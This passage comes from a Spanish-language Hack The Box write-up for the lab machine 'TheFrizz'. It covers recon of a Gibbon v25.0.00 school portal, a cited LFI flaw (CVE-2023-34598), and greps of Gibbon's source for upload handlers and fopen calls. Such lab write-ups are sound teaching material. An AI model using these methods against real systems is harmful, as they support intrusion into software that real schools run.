</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Established <span class="m">1</span> SMB connections<span class="o">(</span>s<span class="o">)</span> and <span class="m">0</span> authenticated session<span class="o">(</span>s<span class="o">)</span>                                                      
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Something weird happened on <span class="o">(</span>10.10.11.60<span class="o">)</span> Error occurs <span class="k">while</span> reading from remote<span class="o">(</span>104<span class="o">)</span> on line <span class="m">1015</span>                       
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Closed <span class="m">1</span> connections                                                                                                     
</span></span><span class="line"><span class="cl">â¯ 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="web-site">Web Site</h2>
<p>El sitio web nos redirige al subdominio <code>frizzdc.frizz.htb</code> el cual agregamos al archivo <code>/etc/hosts</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ curl -sI 10.10.11.60
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">302</span> Found
</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">19</span> Mar <span class="m">2025</span> 06:22:41 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.58 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/3.1.3 PHP/8.2.12
</span></span><span class="line"><span class="cl">Location: http://frizzdc.frizz.htb/home/
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>El dominio nos redirige al subdominio.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ curl -sI frizz.htb
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">302</span> Found
</span></span><span class="line"><span class="cl">Date: Wed, <span class="m">19</span> Mar <span class="m">2025</span> 06:23:57 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.58 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/3.1.3 PHP/8.2.12
</span></span><span class="line"><span class="cl">Location: http://frizzdc.frizz.htb/home/
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>El sitio presenta informacion de una escuela.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134270831.png"></p>
<p>El boton de &lsquo;Staff Login&rsquo; nos redirige al login de <strong>Gibbon</strong> en su version <code>v25.0.00</code>.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134271050.png"></p>
<h1 id="gibbon-v25000">Gibbon v25.0.00</h1>
<p>La version de Gibbon tiene una vulnerabilidad LFI (CVE-2023-34598) que permite incluir archivos mediante <code>q=[file]</code>, unicamente presentes en la carpeta de gibbon. En este caso se cargo el archivo .sql.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134273807.png"></p>
<h2 id="analysis---gibbon-repo">Analysis - Gibbon Repo</h2>
<p>Clonamos Gibbon de github en la rama que pertenece a su version <a href="https://github.com/GibbonEdu/core/tree/v25.0.00">v25.0.00</a> para buscar algun archivo que nos permita el acceso al portal, credenciales, subida de archivos o a la misma maquina.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ git clone -b v25.0.00 https://github.com/GibbonEdu/core.git Gibbon
</span></span></code></pre></td></tr></table>
</div>
</div><p>Encontramos una lista muy larga de archivos y carpetas dentro del proyecto.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ ls
</span></span><span class="line"><span class="cl">ï„• cli           ï…œ CHANGELOG.txt    î˜ˆ index.php                                        î˜ˆ indexFindRedirect.php              ï€– phpstan.neon                    î˜ˆ roleSwitcherProcess.php
</span></span><span class="line"><span class="cl">ï„• i18n          î˜ˆ composer.json    î˜ˆ index_fastFinder_ajax.php                        î˜ˆ keepAlive.php                      î˜ˆ preferences.php                 î˜ˆ update.php
</span></span><span class="line"><span class="cl">ï„• installer     î˜ˆ composer.lock    î˜ˆ index_notification_ajax.php                      î˜Š LICENSE                            î˜ˆ preferencesPasswordProcess.php  î˜ˆ version.php
</span></span><span class="line"><span class="cl">ï„¡ lib           î˜ˆ error.php        î˜ˆ index_notification_ajax_alarm.php                î˜ˆ login.php                          î˜ˆ preferencesProcess.php          î˜ˆ yearSwitcherProcess.php
</span></span><span class="line"><span class="cl">ï„• modules       î˜ˆ export.php       î˜ˆ index_notification_ajax_alarm_tickUpdate.php     î˜ˆ logout.php                         î˜ˆ privacyPolicy.php               
</span></span><span class="line"><span class="cl">ï„• resources     ï€… favicon.ico      î˜ˆ index_notification_ajax_alarmConfirmProcess.php  î˜ˆ notifications.php                  î˜ˆ publicRegistration.php          
</span></span><span class="line"><span class="cl">ó±§¼ src           î˜ˆ fullscreen.php   î˜ˆ index_notification_ajax_alarmProcess.php         î˜ˆ notificationsActionProcess.php     î˜ˆ publicRegistrationCheck.php     
</span></span><span class="line"><span class="cl">ó°™¨ tests         î˜ˆ functions.php    î˜ˆ index_parentPhotoDeleteProcess.php               î˜ˆ notificationsDeleteAllProcess.php  î˜ˆ publicRegistrationProcess.php   
</span></span><span class="line"><span class="cl">ï„• themes        î˜ˆ gibbon.php       î˜ˆ index_parentPhotoUploadProcess.php               î˜ˆ notificationsDeleteProcess.php     î˜‰ README.md                       
</span></span><span class="line"><span class="cl">ï„• uploads       ï‡€ gibbon.sql       î˜ˆ index_tt_ajax.php                                î˜ˆ passwordReset.php                  î˜ˆ report.php                      
</span></span><span class="line"><span class="cl">î˜ˆ CHANGEDB.php  ï‡€ gibbon_demo.sql  î˜ˆ indexExport.php                                  î˜ˆ passwordResetProcess.php           ó°š© robots.txt                      
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="upload-files---fail">Upload Files - Fail</h2>
<p>Iniciamos buscando archivos que utilicen la carpeta uploads, se listan multiples archivos.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ grep --color -iwr <span class="s2">&#34;uploads&#34;</span> <span class="p">|</span> grep -v <span class="s2">&#34;lib/*&#34;</span> <span class="p">|</span> grep -v themes <span class="p">|</span> grep -v .github 2&gt;/dev/null
</span></span><span class="line"><span class="cl">resources/imports/usersFull.yml:        desc: <span class="s2">&#34;path from /uploads/ to medium portrait image (240px by 320px)&#34;</span>
</span></span><span class="line"><span class="cl">resources/imports/usersBasic.yml:        desc: <span class="s2">&#34;path from /uploads/ to medium portrait image (240px by 320px)&#34;</span>
</span></span><span class="line"><span class="cl">resources/imports/usersStaff.yml:        desc: <span class="s2">&#34;path from /uploads/ to medium portrait image (240px by 320px)&#34;</span>
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_addProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_editProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Staff/coverage_view_editProcess.php:        // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Staff/applicationFormProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Staff/applicationForm_manage_editProcess.php:                            // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Finance/expenseRequest_manage_reimburseProcess.php:                        // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Students/report_students_IDCards.php:                // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Students/medicalForm_manage_condition_editProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Students/applicationFormProcess.php:                        // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Students/applicationForm_manage_editProcess.php:                            // Handle multiple file uploads <span class="o">(</span>and transpose array<span class="o">)</span>
</span></span><span class="line"><span class="cl">modules/Students/applicationForm_manage_editProcess.php:                            <span class="nv">$uploads</span> <span class="o">=</span> array<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Students/applicationForm_manage_editProcess.php:                                    <span class="nv">$uploads</span><span class="o">[</span><span class="nv">$subkey</span><span class="o">][</span><span class="nv">$key</span><span class="o">]</span> <span class="o">=</span> <span class="nv">$subvalue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Students/applicationForm_manage_editProcess.php:                            foreach <span class="o">(</span><span class="nv">$uploads</span> as <span class="nv">$file</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">modules/Students/applicationForm_manage_editProcess.php:                                // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Students/medicalForm_manage_condition_addProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Formal Assessment/externalAssessment_manage_details_addProcess.php:            // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Formal Assessment/internalAssessment_manage_addProcess.php:            // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Formal Assessment/internalAssessment_write_dataProcess.php:                            // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Formal Assessment/internalAssessment_write_dataProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Formal Assessment/externalAssessment_manage_details_editProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/Formal Assessment/internalAssessment_manage_editProcess.php:                    // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/User Admin/user_manage_editProcess.php:                            // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">modules/User Admin/user_manage_addProcess.php:                            // Upload the file, <span class="k">return</span> the /uploads relative path
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># [...] snip [...]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â¯ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>El archivo <code>staff_manage_edit_contract_addProcess</code> muestra el uso de <code>FileUploader</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># modules/Staff/staff_manage_edit_contract_addProcess.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$fileUploader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Gibbon\FileUploader</span><span class="p">(</span><span class="nv">$pdo</span><span class="p">,</span> <span class="nv">$gibbon</span><span class="o">-&gt;</span><span class="na">session</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$form</span><span class="o">-&gt;</span><span class="na">addRow</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$row</span><span class="o">-&gt;</span><span class="na">addLabel</span><span class="p">(</span><span class="s1">&#39;file1&#39;</span><span class="p">,</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;Contract File&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$row</span><span class="o">-&gt;</span><span class="na">addFileUpload</span><span class="p">(</span><span class="s1">&#39;file1&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">accepts</span><span class="p">(</span><span class="nv">$fileUploader</span><span class="o">-&gt;</span><span class="na">getFileExtensions</span><span class="p">(</span><span class="s1">&#39;Document&#39;</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Se listan varios archivos que lo utilizan.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ grep --color -iwr <span class="s2">&#34;FileUploader&#34;</span> <span class="p">|</span> grep -v <span class="s2">&#34;lib/*&#34;</span> <span class="p">|</span> grep -v themes <span class="p">|</span> grep -v <span class="s2">&#34;.git*&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_addProcess.php:                    <span class="nv">$fileUploader</span>-&gt;getFileExtensions<span class="o">(</span><span class="s1">&#39;Document&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_addProcess.php:                    <span class="nv">$contractUpload</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$file</span>, <span class="nv">$username</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_add.php:                <span class="nv">$row</span>-&gt;addFileUpload<span class="o">(</span><span class="s1">&#39;file1&#39;</span><span class="o">)</span>-&gt;accepts<span class="o">(</span><span class="nv">$fileUploader</span>-&gt;getFileExtensions<span class="o">(</span><span class="s1">&#39;Document&#39;</span><span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/applicationForm_manage_edit.php:                                -&gt;accepts<span class="o">(</span><span class="nv">$fileUploader</span>-&gt;getFileExtensions<span class="o">())</span>
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_edit.php:                    -&gt;accepts<span class="o">(</span><span class="nv">$fileUploader</span>
</span></span><span class="line"><span class="cl">modules/Staff/applicationForm.php:                        -&gt;accepts<span class="o">(</span><span class="nv">$fileUploader</span>-&gt;getFileExtensions<span class="o">())</span>
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_editProcess.php:                    <span class="nv">$fileUploader</span>-&gt;getFileExtensions<span class="o">(</span><span class="s1">&#39;Document&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/staff_manage_edit_contract_editProcess.php:                    <span class="nv">$contractUpload</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$file</span>, <span class="nv">$username</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/coverage_view_editProcess.php:use Gibbon<span class="se">\F</span>ileUploader<span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/coverage_view_editProcess.php:        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/applicationFormProcess.php:                    <span class="nv">$attachment</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$file</span>, <span class="s1">&#39;StaffApplicationDocument&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Staff/applicationForm_manage_editProcess.php:                            <span class="nv">$attachment</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$file</span>, <span class="s1">&#39;ApplicationDocument&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Finance/expenseRequest_manage_reimburseProcess.php:                        <span class="nv">$attachment</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$file</span>, <span class="nv">$row</span><span class="o">[</span><span class="s1">&#39;title&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Students/applicationForm_manage_edit.php:                    -&gt;accepts<span class="o">(</span><span class="nv">$fileUploader</span>-&gt;getFileExtensions<span class="o">())</span>
</span></span><span class="line"><span class="cl">modules/Students/report_students_IDCards.php:                <span class="nv">$attachment</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$file</span>, <span class="s1">&#39;Card_BG&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Students/report_students_IDCards.php:                        <span class="nb">echo</span> <span class="s1">&#39; &#39;</span>.<span class="nv">$fileUploader</span>-&gt;getLastError<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Students/medicalForm_manage_condition_editProcess.php:use Gibbon<span class="se">\F</span>ileUploader<span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Students/medicalForm_manage_condition_editProcess.php:                    <span class="nv">$attachment</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s1">&#39;attachment&#39;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Students/applicationForm.php:                    -&gt;accepts<span class="o">(</span><span class="nv">$fileUploader</span>-&gt;getFileExtensions<span class="o">())</span>
</span></span><span class="line"><span class="cl">modules/Students/applicationFormProcess.php:                        <span class="nv">$attachment</span> <span class="o">=</span> <span class="nv">$fileUploader</span>-&gt;uploadFromPost<span class="o">(</span><span class="nv">$file</span>, <span class="s1">&#39;ApplicationDocument&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [...] snip [...]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>El codigo de <code>FileUploader.php</code> muestra la subida de archivos, sin embargo este genera parte del nombre del archivo totalmente random por lo que seria casi imposible encontrar el nombre del archivo en tan poco tiempo.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getRandomizedFilename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$destinationFolder</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileSuffixType</span> <span class="o">==</span> <span class="nx">self</span><span class="o">::</span><span class="na">FILE_SUFFIX_NONE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span><span class="nx">mb_strrchr</span><span class="p">(</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$filename</span><span class="p">),</span> <span class="s1">&#39;.&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">mb_strrpos</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^a-zA-Z0-9_-]/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Use password policy to generate random string
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$randStrGenerator</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PasswordPolicy</span><span class="p">(</span><span class="k">true</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$count</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="nv">$count</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileSuffixType</span> <span class="o">==</span> <span class="nx">self</span><span class="o">::</span><span class="na">FILE_SUFFIX_INCREMENTAL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$suffix</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span><span class="o">?</span> <span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$count</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$suffix</span> <span class="o">=</span> <span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$randStrGenerator</span><span class="o">-&gt;</span><span class="na">generate</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nv">$randomizedFilename</span> <span class="o">=</span> <span class="nv">$name</span><span class="o">.</span><span class="nv">$suffix</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nv">$extension</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$destinationFolder</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$randomizedFilename</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$randomizedFilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="dangerous-functions">Dangerous Functions</h2>
<p>Con la subida de archivos descartada realizamos una busqueda de <a href="https://loadforge.com/guides/disable-dangerous-php-functions-for-enhanced-security">funciones peligrosas</a>. Encontramos el uso de la funcion <code>fopen()</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ grep --color -iwr <span class="s2">&#34;fopen&#34;</span> <span class="p">|</span> grep -v <span class="s2">&#34;lib/*&#34;</span> <span class="p">|</span> grep -v themes <span class="p">|</span> grep -v <span class="s2">&#34;.git*&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">modules/Timetable Admin/tt_import.php:                        <span class="nv">$handle</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$csvFile</span>, <span class="s1">&#39;r&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">modules/Rubrics/rubrics_visualise_saveAjax.php:<span class="nv">$fp</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$absolutePath</span>.<span class="s1">&#39;/&#39;</span>.<span class="nv">$imgPath</span>, <span class="s1">&#39;w&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">tests/unit/Installer/ProcessConfigVarsTest.php:        <span class="nv">$fh</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$filename</span>, <span class="s1">&#39;w&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">tests/unit/Installer/ProcessConfigVarsTest.php:        <span class="nv">$fh</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$filename</span>, <span class="s1">&#39;w&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">src/Install/Installer.php:        <span class="nv">$fp</span> <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$context</span>-&gt;getConfigPath<span class="o">()</span>, <span class="s1">&#39;wb&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">src/Data/Importer.php:        <span class="nv">$this</span>-&gt;csvFileHandler <span class="o">=</span> fopen<span class="o">(</span><span class="nv">$csvFile</span>, <span class="s2">&#34;r&#34;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">â¯ 
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>tt_import.php</code> necesita acceso al portal y como administrador para poder acceder a la funcion.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134275130.png"></p>
